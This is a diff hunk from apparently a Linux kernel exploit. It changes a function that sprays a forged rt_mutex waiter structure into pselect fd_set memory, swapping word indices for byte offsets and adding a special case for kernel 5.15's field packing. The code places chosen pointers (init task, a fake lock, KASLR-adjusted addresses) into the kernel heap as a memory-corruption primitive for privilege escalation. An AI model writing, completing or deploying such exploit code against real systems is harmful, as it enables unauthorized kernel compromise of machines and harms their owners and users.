@@ -114,28 +114,35 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 
   int words_per_set = slide_pselect_words_per_set();
   struct slide_waiter_word {
-    int word;
+    size_t off;
     uint64_t value;
     const char *name;
   } words[] = {
-    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
-    {1, 0, "tree_right"},
-    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
-    {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_LOGGERS_0_1, "pi0"},
-    {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
-    {8, FAKE_WAITER_PRIO, "pi_prio"},
-    {9, 0, "pi_deadline"},
-    {10, SLIDE_INIT_TASK, "task"},
-    {11, fake_lock, "lock"},
-    {12, 3, "wake_state"},
-    {13, 0, "ww_ctx"},
+    {0x00, SLIDE_LOGGERS_0_1, "tree_pc"},
+    {0x08, 0, "tree_right"},
+    {0x10, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
+    {FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO, "tree_prio"},
+    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, SLIDE_LOGGERS_0_1, "pi0"},
+    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0, "pi1"},
+    {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
+    {FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO, "pi_prio"},
+    {FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0, "pi_deadline"},
+    {FAKE_WAITER_TASK_OFF, SLIDE_INIT_TASK, "task"},
+    {FAKE_WAITER_LOCK_OFF, fake_lock, "lock"},
+    {FAKE_WAITER_WAKE_STATE_OFF, 3, "wake_state"},
+    {FAKE_WAITER_WW_CTX_OFF, 0, "ww_ctx"},
   };
+  /* 5.15 packs wake_state (u32) and the shared prio (u32) into one qword;
+   * the wake_state entry must stay last so its combined value wins. */
+  if (FAKE_WAITER_WAKE_STATE_OFF + 4 == FAKE_WAITER_PI_TREE_PRIO_OFF &&
+      (FAKE_WAITER_PI_TREE_PRIO_OFF & 7) == 4) {
+    words[sizeof(words) / sizeof(words[0]) - 2].value =
+      ((uint64_t)FAKE_WAITER_PRIO << 32) | 3;
+  }
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
     struct slide_waiter_word *w = &words[i];
     slide_pselect_put_waiter_word(
-        in, out, ex, words_per_set, w->word, w->value, w->name);
+        in, out, ex, words_per_set, (int)(w->off / 8), w->value, w->name);
   }
 }
 
